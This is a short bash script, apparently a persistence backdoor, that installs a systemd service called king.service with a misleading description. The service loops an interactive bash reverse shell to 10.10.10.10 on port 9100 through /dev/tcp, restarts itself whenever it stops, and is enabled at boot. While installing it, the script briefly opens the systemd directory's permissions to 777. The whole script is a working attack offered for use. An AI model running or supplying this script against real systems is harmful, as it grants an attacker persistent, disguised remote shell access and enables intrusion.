#!/bin/bash

IP="10.10.10.10"
PORT="9100"

chmod 777 /etc/systemd/system

echo -e "[Unit]
Description=Required for the effective running of port 9999

[Service]
Type=simple
ExecStart=/bin/bash -c \"while [ 1 ]; do /bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1; sleep 10; done\"
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
" > /etc/systemd/system/king.service

# systemctl enable /etc/systemd/system/king.service
systemctl enable king
systemctl start king

chmod 751 /etc/systemd/system
